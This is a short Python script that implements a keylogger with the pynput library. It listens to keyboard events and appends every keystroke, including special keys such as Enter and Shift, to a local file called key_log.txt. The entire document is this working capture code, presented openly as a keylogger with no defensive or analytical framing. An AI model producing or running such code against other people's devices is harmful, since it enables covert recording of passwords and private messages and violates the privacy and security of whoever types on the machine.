from pynput.keyboard import Listener

LOG_FILE = "key_log.txt"

def on_press(key):
   
    # Callback function to handle keypress events.
    # Logs each key to a file.
    
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")  # Logs printable characters
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            file.write(f" [{key}] ")  # Logs special keys like Enter or Shift

def main():
    
    #Main function to start the keylogger.
    
    print("Keylogger is running... Press Ctrl+C to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
